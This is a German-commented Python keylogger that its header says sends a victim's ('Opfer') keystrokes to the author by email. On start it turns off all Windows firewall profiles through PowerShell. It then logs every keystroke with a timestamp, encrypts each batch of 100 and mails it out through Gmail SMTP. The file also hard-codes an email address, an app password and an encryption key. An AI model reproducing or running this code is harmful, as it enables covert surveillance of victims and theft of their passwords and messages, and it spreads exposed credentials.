"""
Author: Leon Huskaj
Date: 27.02.2025
Version: 1.7
Description: Keylogger Projekt
Dieser Code sendet die Keystrokes vom Opfer an dich per Mail.
"""

# Bibliotheken imports
import smtplib
import ssl
import subprocess
from datetime import datetime
from pynput.keyboard import Listener
from cryptography.fernet import Fernet

# Firewall deaktivieren (Von ChatGPT abgeleitet)
def disable_firewall():
    try:
        subprocess.run(["powershell", "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"], check=True, shell=True)
        print("Windows Defender Firewall wurde deaktiviert.")
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Deaktivieren der Firewall: {e}")

# Schlüssel von --> key.key
ENCRYPTION_KEY = b'kNryyxr5cPQqaIJ__DCIzzZ0Rrp7KRj4lT1-zML5KRw='
cipher = Fernet(ENCRYPTION_KEY)

# E-Mail Empfängerangaben
EMAIL_SENDER = "leon.huskaj1212@gmail.com"
EMAIL_PASSWORD = "okzk edtt lsaq husd"
EMAIL_RECEIVER = "leon.huskaj1212@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

# Ab wie vielen Keystrokes die Mail gesendet wird
keystrokes = []
THRESHOLD = 100

# Verschlüsselung der Nachricht, die per Mail gesendet wird
def encrypt_message(message: str) -> str:
    encrypted_bytes = cipher.encrypt(message.encode())
    return encrypted_bytes.decode()

# Mail senden
def send_email():
    global keystrokes
    if not keystrokes:
        return

    plaintext = ''.join(keystrokes)
    encrypted_text = encrypt_message(plaintext)

    message = f"Subject: Keylogger Report\n\n{encrypted_text}"

    # Baut eine SSL-Verbindung auf und meldet sich mit Zugangsdaten an
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)
        print("E-Mail erfolgreich gesendet (verschlüsselt).")
    except Exception as e:
        print(f"Fehler beim Senden der E-Mail: {e}")

    keystrokes = []

# Keypress erkennen
def on_press(key):
    global keystrokes

    # Zeit und Datum pro Keylog
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Struktur des Keylogs mit Timestamp
    try:
        key_data = f"{timestamp} - {key.char}\n"
    except AttributeError:
        key_data = f"{timestamp} - [{key}]\n"

    keystrokes.append(key_data)

    # Wenn Keystrokes über dem Threshold sind, wird eine E-Mail gesendet
    if len(keystrokes) >= THRESHOLD:
        send_email()

# Script Start
def main():
    disable_firewall()  # Firewall beim Start deaktivieren
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
